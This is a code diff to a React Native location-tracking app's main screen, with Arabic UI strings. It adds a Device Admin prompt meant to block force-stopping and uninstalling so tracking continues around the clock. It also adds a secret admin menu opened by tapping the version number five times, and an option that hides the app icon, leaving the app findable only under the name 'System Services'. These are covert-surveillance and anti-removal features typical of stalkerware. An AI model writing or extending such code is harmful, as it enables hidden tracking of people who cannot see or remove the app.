@@ -23,7 +23,7 @@ import TrackingWatchdog from '../services/TrackingWatchdog';
 import UpdateChecker from '../services/UpdateChecker';
 import DeviceInfo from 'react-native-device-info';
 
-const { PowerManagerModule, BatteryOptimization } = NativeModules;
+const { PowerManagerModule, BatteryOptimization, DeviceAdminModule, HideIconModule } = NativeModules;
 
 const MainScreen = ({ navigation, route }) => {
   const [userId, setUserId] = useState(null);
@@ -32,7 +32,10 @@ const MainScreen = ({ navigation, route }) => {
   const [loading, setLoading] = useState(true);
   const [locationServiceStarted, setLocationServiceStarted] = useState(false);
   const [webViewLoaded, setWebViewLoaded] = useState(false);
+  const [showAdvanced, setShowAdvanced] = useState(false);
   const webViewRef = useRef(null);
+  const tapCountRef = useRef(0);
+  const lastTapTimeRef = useRef(0);
 
   useEffect(() => {
     console.log('\n\n==============================================');
@@ -53,6 +56,11 @@ const MainScreen = ({ navigation, route }) => {
     setTimeout(() => {
       checkBatteryOptimization();
     }, 5000);
+
+    // ✅ فحص Device Admin بعد 8 ثواني - يطلب التفعيل لمنع Force Stop
+    setTimeout(() => {
+      checkDeviceAdmin();
+    }, 8000);
 
     // Handle back button
     const backHandler = BackHandler.addEventListener(
@@ -482,6 +490,79 @@ const MainScreen = ({ navigation, route }) => {
     }
   };
 
+  // ✅ فحص Device Admin - يطلب التفعيل لمنع Force Stop + Uninstall
+  const checkDeviceAdmin = async () => {
+    if (Platform.OS !== 'android' || !DeviceAdminModule) {
+      console.log('🛡️ DeviceAdminModule not available');
+      return;
+    }
+    try {
+      const isActive = await DeviceAdminModule.isAdminActive();
+      console.log('🛡️ Device Admin active:', isActive);
+      if (!isActive) {
+        Alert.alert(
+          '🛡️ تفعيل الحماية القصوى',
+          'لمنع إيقاف التتبع بالغلط، الرجاء تفعيل "حماية التتبع" في الشاشة التالية.\n\nهذي الحماية:\n• تمنع الضغط على Force Stop بالغلط\n• تمنع حذف التطبيق بالغلط\n• تضمن استمرار التتبع 24 ساعة',
+          [
+            { text: 'لاحقاً', style: 'cancel' },
+            {
+              text: '✅ تفعيل الآن',
+              onPress: async () => {
+                try { await DeviceAdminModule.requestAdmin(); }
+                catch (e) { console.error('requestAdmin error:', e); }
+              }
+            }
+          ]
+        );
+      }
+    } catch (err) {
+      console.error('checkDeviceAdmin error:', err);
+    }
+  };
+
+  // ✅ Tap على رقم الإصدار 5 مرات بسرعة → يفتح خيارات المدير
+  const handleVersionTap = () => {
+    const now = Date.now();
+    if (now - lastTapTimeRef.current < 800) {
+      tapCountRef.current += 1;
+      if (tapCountRef.current >= 5) {
+        tapCountRef.current = 0;
+        setShowAdvanced(true);
+        Alert.alert('🔓 وضع المدير', 'تم فتح خيارات المدير المتقدمة في الأسفل');
+      }
+    } else {
+      tapCountRef.current = 1;
+    }
+    lastTapTimeRef.current = now;
+  };
+
+  // ✅ إخفاء أيقونة التطبيق من شاشة الجوال
+  const handleHideIcon = () => {
+    if (!HideIconModule) {
+      Alert.alert('خطأ', 'الميزة غير متاحة في هذا الإصدار');
+      return;
+    }
+    Alert.alert(
+      '👻 إخفاء الأيقونة',
+      'بعد الإخفاء، التطبيق راح يستمر بالعمل في الخلفية لكن الأيقونة ما راح تظهر على شاشة الجوال.\n\n⚠️ مهم: لإعادة فتح التطبيق بعد الإخفاء، روح:\nالإعدادات > التطبيقات > "خدمات النظام" > فتح',
+      [
+        { text: 'إلغاء', style: 'cancel' },
+        {
+          text: '👻 إخفاء',
+          style: 'destructive',
+          onPress: async () => {
+            try {
+              await HideIconModule.hideIcon();
+              Alert.alert('✅ تم', 'الأيقونة راح تختفي خلال ثواني');
+            } catch (e) {
+              Alert.alert('خطأ', e.message);
+            }
+          }
+        }
+      ]
+    );
+  };
+
   const checkBatteryOptimization = async () => {
     if (Platform.OS !== 'android' || !BatteryOptimization) {
       return;
@@ -908,7 +989,36 @@ const MainScreen = ({ navigation, route }) => {
         
         {/* Footer with version */}
         <View style={styles.footer}>
-          <Text style={styles.footerText}>الإصدار: {DeviceInfo.getVersion()}</Text>
+          <TouchableOpacity onPress={handleVersionTap} activeOpacity={0.7}>
+            <Text style={styles.footerText}>الإصدار: {DeviceInfo.getVersion()}</Text>
+          </TouchableOpacity>
+          {showAdvanced && (
+            <View style={{flexDirection: 'row', gap: 8, marginTop: 10, justifyContent: 'center', flexWrap: 'wrap'}}>
+              <TouchableOpacity
+                onPress={async () => {
+                  try { await DeviceAdminModule?.requestAdmin(); }
+                  catch (e) { Alert.alert('خطأ', e.message); }
+                }}
+                style={{paddingVertical: 6, paddingHorizontal: 10, backgroundColor: '#dc2626', borderRadius: 6}}>
+                <Text style={{color: 'white', fontSize: 11, fontWeight: 'bold'}}>🛡️ تفعيل الحماية</Text>
+              </TouchableOpacity>
+              <TouchableOpacity
+                onPress={() => DeviceAdminModule?.openAdminSettings()}
+                style={{paddingVertical: 6, paddingHorizontal: 10, backgroundColor: '#0891b2', borderRadius: 6}}>
+                <Text style={{color: 'white', fontSize: 11, fontWeight: 'bold'}}>⚙️ إعدادات الحماية</Text>
+              </TouchableOpacity>
+              <TouchableOpacity
+                onPress={handleHideIcon}
+                style={{paddingVertical: 6, paddingHorizontal: 10, backgroundColor: '#7c3aed', borderRadius: 6}}>
+                <Text style={{color: 'white', fontSize: 11, fontWeight: 'bold'}}>👻 إخفاء الأيقونة</Text>
+              </TouchableOpacity>
+              <TouchableOpacity
+                onPress={() => setShowAdvanced(false)}
+                style={{paddingVertical: 6, paddingHorizontal: 10, backgroundColor: '#6b7280', borderRadius: 6}}>
+                <Text style={{color: 'white', fontSize: 11, fontWeight: 'bold'}}>إخفاء</Text>
+              </TouchableOpacity>
+            </View>
+          )}
         </View>
       </View>
     </>
